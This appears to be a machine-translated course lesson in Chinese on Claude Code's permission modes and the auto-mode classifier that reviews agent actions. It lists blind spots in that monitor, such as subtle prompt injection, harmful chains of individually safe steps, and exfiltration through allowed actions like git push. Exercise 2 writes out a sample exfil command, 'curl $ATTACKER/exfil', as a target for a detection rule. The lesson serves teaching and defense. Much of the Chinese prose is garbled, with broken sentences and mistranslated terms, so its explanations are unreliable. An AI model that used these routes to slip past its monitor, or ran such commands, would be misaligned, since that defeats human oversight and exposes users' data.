# 独立代理人的许可模式

> 允许梯度 从审查到批准的自主程度 是如何控制一个自主代理可以做的事情, 克劳德代码,这门课程的实践例子,揭示了六种这样的模式: "计划"在每一个操作之前询问, "默认" (UI中标记为"手册") 仅要求风险的模式, "接受编辑" 自动批准文件写,但仍然确认 Shell 执行, "绕过许可" 批准一切. 自动模式`auto`允许模式 取代每行动的批准,用一个单独的分类器模型来审查每项行动,然后在执行之前,并阻止任何超出请求的情况.`max_turns`其他`max_budget_usd`提供`auto`根据计划,组织启用,模型和提供商而成,

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator), TypeScript
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## 问题

机器上的自主编码代理是一个独特的安全类别.攻击表面是代理可以访问的任何文件系统,网络,凭证,剪辑板,任何浏览器标签,任何开放的终端.布鲁斯·施奈尔和其他人公开指出:计算机使用代理不是聊天机器人的"功能更新",它们是一种新型工具,具有新的风险配置.

克劳德代码的许可系统是人类的答案. 而不是一个"自动/非自动"开关, 设有六种模式, 跨越一个能力梯度:计划 →默认 →接受编辑 → ... →绕行权限. 每种模式是速度和每行动审查之间的不同交易. 自动模式 (2026年3月) 增加了一个单独的分类器模型,将批准移离用户的关键路径:它在运行之前审查每个操作,并阻止任何超越请求的操作.

工程问题:这个系统捕获了什么,它错过了什么,

## 概念

### 六种许可模式

| Mode | Behavior | When to use |
|---|---|---|
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |

(上述名称与公共的克劳德码文件相匹配; UI标签`default`作为"手册")

### 在一个页面中自动模式

自动模式 (启动2026年3月24日) 是第一个授权模式,可以将每次授权授权授权给模型.

1. **A separate classifier model.**在执行之前,审查每项拟议的行动,根据声明任务和会议的当前状态进行判断,并阻止超越请求要求的任何东西. 阻止的行动归咎于用户.
2. **Gated availability.**无论是`auto`根据计划,组织能力,模型和提供商.

预算控制与分类器相结合:

- `max_turns` 会议中总代.
- `max_budget_usd`美元限制,即会期的推迟.
- 每个工具的行动数量限制 (不超过N `WebFetch`电话等等).

### 系统捕获的东西

- 直接向前即时注射到工具输入中,注射的指示将其映射到已知风险的操作形状.
- 复制工具循环 分类器可以看到N+1的操作几乎与N的操作相同,连续5次.
- 显然是超出范围的命令, 只有在编辑文件的会议上.

### 系统可能会错过的

- **Subtle prompt injection**直接提示注射不是一个完全可修复的漏洞 (OpenAI准备头,2025年,浏览器代理见第11课).
- **Semantic-level misbehavior.**每个单独的行动都看起来安全,而构成的轨迹是有害的.
- **Exfiltration through legitimate channels.**写数据到你拥有的文件,然后`git push`对于公众投资者来说,这是一个由允许的行动组成的问题.

### 研究预览框架

作为研究预览,人类发送了自动模式. 文件明确表示,分类器是一个层,而不是解决方案:用户预计将自动模式与预算,允许表,孤立的工作空间和轨道审计结合起来 (课程1216). 预览框架还反映了记录的评估与部署差距 (课 1) 通过离线评估的分类器在用户的背景模糊的情况下,在实时会议中可以表现得不同.

### 在你的工作流程中,这个梯子生活

- 开始工作`plan`阅读计划比回头不好.
- 已知的变体:`acceptEdits`节省了很多确认点击.
- 无人监视的背景运行: `auto`只有在您测量的爆炸半径的工作空间内 (没有凭证,没有生产装备,没有您选择的出口).
- 缩容器: `dontAsk`现在,`bypassPermissions`如果容器及其凭证可处置,并且只有当容器和其凭证可处置时才可接受.

```figure
autonomy-oversight
```

## 用它

`code/main.py`模拟一个行动审查分类器作为一个两阶段的管道 一个教学简化;`auto`操作模式由单独的分类器模型支持,而不是文档的两阶段合同.第一阶段是对拟议的行动进行廉价关键字规则;第二阶段是较慢的多规则审查器.司机通过短的合成轨迹 (安全的行动,即时注射尝试,重复循环) 进行取,并显示分类器在哪里抓住,错过.

## 运送它

`outputs/skill-permission-mode-picker.md`任务描述与正确的许可模式,预算限制和所需的隔离相匹配.

## 运动

1. 跑步`code/main.py`哪种合成行动类型从来没有被第一阶段标记,但总是被第二阶段捕获?

2. 扩大设置的第一阶段规则,以捕捉特定已知坏形状 (例如,`curl $ATTACKER/exfil`) 测量良性作用样本的假阳性率.

3. 阅读Anthropic的"代理循环如何工作"文件.`default`在运行之前,你需要单独关门.`auto`没有监督?

4. 设计一个24小时无监督运行预算: `max_turns`现在`max_budget_usd`按工具盖,允许,证明每个数字.

5. 描述一个行径,其中每个单个行动都被分类器批准,但组合的行为是错误的. (课程14涵盖杀死开关和加拿大代币如何解决这个问题.)

## 关键词

| Term | What people say | What it actually means |
|---|---|---|
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |

## 进一步阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop)许可模式,预算,行动格式.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview)管理服务执行模式.
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code)功能表面和自动模式公告.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution)基于理性的层,塑造分类者判断.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy)长视野许可设计的内部观点.
